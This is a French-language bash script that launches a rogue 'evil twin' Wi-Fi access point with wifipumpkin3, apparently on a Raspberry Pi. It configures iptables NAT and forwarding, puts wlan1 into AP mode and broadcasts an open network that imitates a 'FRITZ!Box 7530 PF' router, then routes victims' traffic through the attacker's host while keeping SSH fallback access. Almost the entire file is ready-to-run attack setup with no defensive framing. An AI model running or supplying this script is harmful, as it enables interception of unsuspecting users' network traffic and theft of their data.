#!/bin/bash
# ============================================================
#  init_attack.sh — Lance le fake AP avec failsafe wlan0
# ============================================================

MGMT_IP="192.168.178.65"
ETH0_NET="192.168.178.0/24"

# ----------------------------------------------------------
# 1. Vérification management (wlan0 = fallback SSH)
# ----------------------------------------------------------
WLAN0_IP=$(ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
ETH0_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ "$WLAN0_IP" != "$MGMT_IP" ]; then
    echo "[!!!] ERREUR : wlan0 n'a pas l'IP de management ($MGMT_IP) ! IP actuelle: $WLAN0_IP"
    exit 1
fi
echo "[+] wlan0 OK ($WLAN0_IP) — fallback SSH actif"

if [ -z "$ETH0_IP" ]; then
    echo "[!] ATTENTION : eth0 n'a pas d'IP ! Vérifier le câble."
    echo "[*] Continuera avec wlan0 uniquement..."
else
    echo "[+] eth0 OK ($ETH0_IP) — connexion principale"
fi

# ----------------------------------------------------------
# 2. Règles iptables : protéger wlan0 (SSH toujours accessible)
# ----------------------------------------------------------
echo "[*] Configuration iptables (failsafe wlan0 + NAT wlan1)..."

# INPUT: toujours accepter SSH sur wlan0 et eth0
sudo iptables -C INPUT -i wlan0 -p tcp --dport 22 -j ACCEPT 2>/dev/null || \
    sudo iptables -I INPUT 1 -i wlan0 -p tcp --dport 22 -j ACCEPT
sudo iptables -C INPUT -i eth0 -p tcp --dport 22 -j ACCEPT 2>/dev/null || \
    sudo iptables -I INPUT 1 -i eth0 -p tcp --dport 22 -j ACCEPT

# INPUT: toujours accepter le trafic établi sur wlan0 (réponses, DNS, etc.)
sudo iptables -C INPUT -i wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || \
    sudo iptables -I INPUT 1 -i wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# FORWARD: wlan1 (fake AP) <-> eth0 (internet)
sudo iptables -C FORWARD -i wlan1 -o eth0 -j ACCEPT 2>/dev/null || \
    sudo iptables -I FORWARD 1 -i wlan1 -o eth0 -j ACCEPT
sudo iptables -C FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || \
    sudo iptables -I FORWARD 2 -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT

# NAT: masquerade le trafic du fake AP vers internet
sudo iptables -t nat -C POSTROUTING -o eth0 -s 10.0.0.0/8 -j MASQUERADE 2>/dev/null || \
    sudo iptables -t nat -A POSTROUTING -o eth0 -s 10.0.0.0/8 -j MASQUERADE

# Failsafe: si eth0 tombe, NAT aussi via wlan0
sudo iptables -t nat -C POSTROUTING -o wlan0 -s 10.0.0.0/8 -j MASQUERADE 2>/dev/null || \
    sudo iptables -t nat -A POSTROUTING -o wlan0 -s 10.0.0.0/8 -j MASQUERADE
sudo iptables -C FORWARD -i wlan1 -o wlan0 -j ACCEPT 2>/dev/null || \
    sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT
sudo iptables -C FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || \
    sudo iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "[+] iptables OK — SSH garanti sur wlan0 + eth0"

# ----------------------------------------------------------
# 3. IP forwarding
# ----------------------------------------------------------
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
echo "[+] IP forwarding activé"

# ----------------------------------------------------------
# 4. Préparation wlan1 (Mode AP)
# ----------------------------------------------------------
echo "[*] Préparation de wlan1 (Mode AP)..."
sudo nmcli device set wlan1 managed no 2>/dev/null
sudo ip link set wlan1 down
sudo ip addr flush dev wlan1
sudo ip link set wlan1 up

# ----------------------------------------------------------
# 5. Générer le fichier pulp (sans WPA2 par défaut)
#    Pour WPA2 : utiliser enable_wpa2.sh
# ----------------------------------------------------------
if [ ! -f /home/pi/cia/attack.pulp ]; then
    cat <<PULP > attack.pulp
set interface wlan1
set ssid FRITZ!Box 7530 PF
set proxy noproxy
start
PULP
    echo "[+] attack.pulp généré (open AP)"
else
    echo "[+] attack.pulp existant conservé"
fi

# ----------------------------------------------------------
# 6. Lancement Docker
# ----------------------------------------------------------
echo "[+] Lancement du build final et de l'attaque..."
docker compose up -d --build

# ----------------------------------------------------------
# 7. Vérification finale
# ----------------------------------------------------------
sleep 8
echo ""
echo "============================================="
echo "  STATUT FINAL"
echo "============================================="
echo "  eth0  : $(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo 'DOWN')"
echo "  wlan0 : $(ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo 'DOWN') (SSH fallback)"
echo "  wlan1 : $(iw dev wlan1 info 2>/dev/null | grep ssid | awk '{$1=""; print $0}' || echo 'DOWN')"
echo "  Docker: $(docker ps --filter name=wifipumpkin3 --format '{{.Status}}' 2>/dev/null || echo 'DOWN')"
echo "============================================="
echo "  SSH accessible via :"
echo "    ssh pi@$ETH0_IP  (eth0, principal)"
echo "    ssh pi@$WLAN0_IP (wlan0, fallback)"
echo "============================================="
